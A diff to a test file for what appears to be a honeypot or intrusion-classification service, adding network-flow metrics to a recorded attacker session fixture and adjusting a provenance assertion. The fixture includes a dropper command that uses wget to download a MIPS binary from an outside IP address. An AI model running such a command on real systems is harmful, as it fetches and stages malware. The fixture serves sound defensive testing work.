@@ -24,6 +24,8 @@ DROPPER_SESSION = {
     "status": "completed",
     "duration_seconds": 96.0,
     "commands": ["uname -a", "cd /tmp", "wget http://185.220.101.5/bins/mips -O mips"],
+    # Measured flow, so the stage-1 model has something to classify.
+    "flow": {"duration": 42.0, "fwd_packets": 30, "fwd_bytes": 2200, "bwd_bytes": 9800, "fwd_max": 512, "bwd_max": 1460, "fwd_iat_mean": 1.2, "fwd_iat_max": 8.0, "flow_iat_max": 8.0},
     "transcript": [
         {"command": "uname -a", "output": "Linux srv01 5.15.0 x86_64\n", "exit_code": 0, "timestamp": 1.0},
         {"command": "cd /tmp", "output": "", "exit_code": 0, "timestamp": 2.0},
@@ -187,7 +189,10 @@ class TestProvenance:
         """Without this the UI cannot say whether a confidence figure is real."""
         session_id, admin = await _ingest(client, auth_headers)
         body = (await client.get(f"/api/v1/sessions/{session_id}", headers=admin)).json()
-        assert body["model_source"] in ("synthetic", "pretrained", "cicids2017")
+        # The rule layer outranks the flow model on this transcript (dropper +
+        # chmod), and says so; the flow model's source is still a model name.
+        assert body["model_source"] in ("synthetic", "pretrained", "cicids2017", "rules")
+        assert body["class_probabilities"]
 
     async def test_cluster_reports_unfitted_rather_than_guessing(
         self, client, auth_headers
